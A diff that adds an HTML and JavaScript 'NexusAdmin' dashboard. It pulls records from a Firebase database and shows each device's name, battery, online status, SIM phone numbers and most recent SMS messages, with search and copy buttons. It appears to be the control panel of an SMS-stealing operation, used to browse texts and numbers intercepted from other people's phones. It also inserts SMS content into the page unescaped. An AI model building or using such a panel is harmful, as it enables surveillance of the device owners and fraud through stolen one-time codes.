@@ -1,1 +1,401 @@
-# Nexus
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NexusAdmin Dashboard</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: #0d0f14;
+    color: #e2e8f0;
+    font-family: 'Segoe UI', sans-serif;
+    min-height: 100vh;
+  }
+
+  header {
+    background: #131720;
+    border-bottom: 1px solid #1e2535;
+    padding: 14px 16px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  header h1 {
+    font-size: 18px;
+    font-weight: 700;
+    color: #60a5fa;
+    letter-spacing: 0.5px;
+  }
+
+  #refresh-btn {
+    background: #1e40af;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    padding: 7px 14px;
+    font-size: 13px;
+    cursor: pointer;
+  }
+
+  #refresh-btn:active { background: #1d4ed8; }
+
+  .controls {
+    padding: 12px 16px;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  #search-input {
+    width: 100%;
+    background: #131720;
+    border: 1px solid #1e2535;
+    border-radius: 10px;
+    padding: 10px 14px;
+    color: #e2e8f0;
+    font-size: 14px;
+    outline: none;
+  }
+
+  #search-input:focus { border-color: #3b82f6; }
+
+  .filter-tabs {
+    display: flex;
+    gap: 8px;
+  }
+
+  .tab {
+    flex: 1;
+    text-align: center;
+    padding: 8px 0;
+    border-radius: 8px;
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    background: #131720;
+    border: 1px solid #1e2535;
+    color: #94a3b8;
+    transition: all 0.2s;
+  }
+
+  .tab.active {
+    background: #1e3a5f;
+    border-color: #3b82f6;
+    color: #60a5fa;
+  }
+
+  .stats-row {
+    display: flex;
+    gap: 8px;
+    padding: 0 16px 12px;
+  }
+
+  .stat-box {
+    flex: 1;
+    background: #131720;
+    border: 1px solid #1e2535;
+    border-radius: 10px;
+    padding: 10px;
+    text-align: center;
+  }
+
+  .stat-box .num {
+    font-size: 22px;
+    font-weight: 700;
+  }
+
+  .stat-box .lbl {
+    font-size: 11px;
+    color: #64748b;
+    margin-top: 2px;
+  }
+
+  .stat-box.online .num { color: #4ade80; }
+  .stat-box.offline .num { color: #f87171; }
+  .stat-box.total .num { color: #60a5fa; }
+
+  .device-list {
+    padding: 0 16px 80px;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .device-card {
+    background: #131720;
+    border: 1px solid #1e2535;
+    border-radius: 12px;
+    padding: 14px;
+    cursor: pointer;
+    transition: border-color 0.2s;
+  }
+
+  .device-card:active { border-color: #3b82f6; }
+
+  .device-header {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 8px;
+  }
+
+  .dot { font-size: 12px; }
+
+  .device-name {
+    font-weight: 700;
+    font-size: 15px;
+    flex: 1;
+  }
+
+  .battery {
+    font-size: 12px;
+    color: #94a3b8;
+  }
+
+  .device-id {
+    font-size: 11px;
+    color: #475569;
+    font-family: monospace;
+    margin-bottom: 6px;
+    word-break: break-all;
+  }
+
+  .sim-row {
+    font-size: 12px;
+    color: #94a3b8;
+    margin-bottom: 3px;
+  }
+
+  .sim-num {
+    color: #60a5fa;
+    font-family: monospace;
+  }
+
+  .divider {
+    border: none;
+    border-top: 1px solid #1e2535;
+    margin: 8px 0;
+  }
+
+  .sms-item {
+    margin-bottom: 6px;
+  }
+
+  .sms-sender {
+    font-size: 11px;
+    font-weight: 700;
+    color: #a78bfa;
+  }
+
+  .sms-msg {
+    font-size: 12px;
+    color: #94a3b8;
+    line-height: 1.4;
+    word-break: break-word;
+  }
+
+  .no-sms {
+    font-size: 12px;
+    color: #475569;
+    font-style: italic;
+  }
+
+  .loading {
+    text-align: center;
+    padding: 60px 20px;
+    color: #475569;
+  }
+
+  .spinner {
+    width: 32px;
+    height: 32px;
+    border: 3px solid #1e2535;
+    border-top-color: #3b82f6;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin: 0 auto 12px;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .empty {
+    text-align: center;
+    padding: 40px 20px;
+    color: #475569;
+    font-size: 14px;
+  }
+
+  .copy-btn {
+    background: #1e2535;
+    border: none;
+    color: #94a3b8;
+    font-size: 11px;
+    padding: 3px 8px;
+    border-radius: 5px;
+    cursor: pointer;
+    margin-left: 6px;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>⚡ NexusAdmin</h1>
+  <button id="refresh-btn" onclick="loadData()">🔄 Refresh</button>
+</header>
+
+<div class="controls">
+  <input id="search-input" type="text" placeholder="🔍 Search name, number, ID, SMS..." oninput="renderDevices()">
+  <div class="filter-tabs">
+    <div class="tab active" onclick="setFilter('all', this)">All</div>
+    <div class="tab" onclick="setFilter('online', this)">🟢 Online</div>
+    <div class="tab" onclick="setFilter('offline', this)">🔴 Offline</div>
+  </div>
+</div>
+
+<div class="stats-row">
+  <div class="stat-box total"><div class="num" id="stat-total">-</div><div class="lbl">Total</div></div>
+  <div class="stat-box online"><div class="num" id="stat-online">-</div><div class="lbl">Online</div></div>
+  <div class="stat-box offline"><div class="num" id="stat-offline">-</div><div class="lbl">Offline</div></div>
+</div>
+
+<div class="device-list" id="device-list">
+  <div class="loading"><div class="spinner"></div>Loading devices...</div>
+</div>
+
+<script>
+const FIREBASE_URL = "https://lalannew5-default-rtdb.firebaseio.com/.json";
+let allDevices = [];
+let currentFilter = 'all';
+
+function extractNumber(simStr) {
+  if (!simStr) return null;
+  simStr = simStr.trim();
+  const match = simStr.match(/^[\+]?(\d{7,15})/);
+  if (match) {
+    let num = match[1];
+    if (num.length === 12 && num.startsWith("91")) num = num.slice(2);
+    return num;
+  }
+  return simStr || null;
+}
+
+async function loadData() {
+  document.getElementById('device-list').innerHTML = '<div class="loading"><div class="spinner"></div>Loading devices...</div>';
+  try {
+    const res = await fetch(FIREBASE_URL);
+    const data = await res.json();
+    const root = data["19112024"]["All_User"];
+    const devices = root["Info"] || {};
+    const simInfo = root["SimINFO"] || {};
+    const smsData = root["Sms"] || {};
+
+    allDevices = Object.entries(devices).map(([key, info]) => {
+      const did = info.did || key;
+      const sim = simInfo[did] || {};
+      const sim1 = extractNumber(sim.sim1);
+      const sim2 = extractNumber(sim.sim2);
+      const smsList = Object.values(smsData[did] || {});
+      smsList.sort((a, b) => parseInt(b.date) - parseInt(a.date));
+      return {
+        key, did,
+        name: info.Name || "Unknown",
+        battery: info.Battery || "?",
+        status: info.status || "Offline",
+        sim1, sim2,
+        sms: smsList.slice(0, 3)
+      };
+    });
+
+    // Stats
+    const total = allDevices.length;
+    const online = allDevices.filter(d => d.status === "Online").length;
+    document.getElementById('stat-total').textContent = total;
+    document.getElementById('stat-online').textContent = online;
+    document.getElementById('stat-offline').textContent = total - online;
+
+    renderDevices();
+  } catch (e) {
+    document.getElementById('device-list').innerHTML = `<div class="empty">❌ Failed to load data.<br>${e.message}</div>`;
+  }
+}
+
+function setFilter(filter, el) {
+  currentFilter = filter;
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+  renderDevices();
+}
+
+function copyText(text) {
+  navigator.clipboard.writeText(text).catch(() => {});
+}
+
+function renderDevices() {
+  const query = document.getElementById('search-input').value.toLowerCase().trim();
+  let list = allDevices;
+
+  if (currentFilter === 'online') list = list.filter(d => d.status === "Online");
+  if (currentFilter === 'offline') list = list.filter(d => d.status === "Offline");
+
+  if (query) {
+    list = list.filter(d => {
+      const smsText = d.sms.map(s => s.msg + " " + s.ph).join(" ").toLowerCase();
+      return (
+        d.name.toLowerCase().includes(query) ||
+        (d.sim1 && d.sim1.includes(query)) ||
+        (d.sim2 && d.sim2.includes(query)) ||
+        d.did.toLowerCase().includes(query) ||
+        smsText.includes(query)
+      );
+    });
+  }
+
+  const container = document.getElementById('device-list');
+  if (list.length === 0) {
+    container.innerHTML = '<div class="empty">No devices found.</div>';
+    return;
+  }
+
+  container.innerHTML = list.map(d => {
+    const dot = d.status === "Online" ? "🟢" : "🔴";
+    const simLines = [
+      d.sim1 ? `<div class="sim-row">📱 SIM1: <span class="sim-num">${d.sim1}</span><button class="copy-btn" onclick="copyText('${d.sim1}')">copy</button></div>` : '',
+      d.sim2 ? `<div class="sim-row">📱 SIM2: <span class="sim-num">${d.sim2}</span><button class="copy-btn" onclick="copyText('${d.sim2}')">copy</button></div>` : '',
+      (!d.sim1 && !d.sim2) ? `<div class="sim-row" style="color:#475569">📵 No SIM info</div>` : ''
+    ].join('');
+
+    const smsLines = d.sms.length > 0
+      ? d.sms.map(s => `
+          <div class="sms-item">
+            <div class="sms-sender">📩 ${s.ph}</div>
+            <div class="sms-msg">${s.msg.substring(0, 100)}</div>
+          </div>`).join('')
+      : '<div class="no-sms">No SMS</div>';
+
+    return `
+      <div class="device-card">
+        <div class="device-header">
+          <span class="dot">${dot}</span>
+          <span class="device-name">${d.name}</span>
+          <span class="battery">🔋${d.battery}%</span>
+        </div>
+        <div class="device-id">🆔 ${d.did}<button class="copy-btn" onclick="copyText('${d.did}')">copy</button></div>
+        ${simLines}
+        <hr class="divider">
+        ${smsLines}
+      </div>`;
+  }).join('');
+}
+
+loadData();
+</script>
+</body>
+</html>
+
